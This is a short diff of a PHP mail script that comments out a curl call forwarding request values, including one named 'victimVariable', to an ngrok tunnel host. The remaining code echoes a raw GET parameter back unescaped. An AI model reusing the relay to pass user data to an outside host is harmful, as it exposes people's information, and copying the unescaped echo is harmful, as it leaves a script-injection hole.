@@ -14,16 +14,16 @@ header('Access-Control-Allow-Headers:Access-Control-Allow-Headers, Origin,Accept
    
    $mail = new PHPMailer(true);
    
-   if ($_GET['passToPC'] == "true") {
-      $curl=curl_init();
-      curl_setopt_array($curl, [
-         CURLOPT_RETURNTRANSFER => 1,
-         CURLOPT_URL => 'https://'.$ngrokSubdomain.'.ngrok.io/php/email2.php?victimVariable='.$_GET['victimVariable'].'&editName='.$_GET['editName'].'&editMessage='.urlencode($_GET['editMessage'])
-      ]);
+   //if ($_GET['passToPC'] == "true") {
+   //   $curl=curl_init();
+   //   curl_setopt_array($curl, [
+   //      CURLOPT_RETURNTRANSFER => 1,
+   //      CURLOPT_URL => 'https://'.$ngrokSubdomain.'.ngrok.io/php/email2.php?victimVariable='.$_GET['victimVariable'].'&editName='.$_GET['editName'].'&editMessage='.urlencode($_GET['editMessage'])
+   //   ]);
       
-      curl_exec($curl);
-      curl_close($curl);
-   }
+   //   curl_exec($curl);
+   //   curl_close($curl);
+   //}
    
    
    echo $_GET['passToPC'];
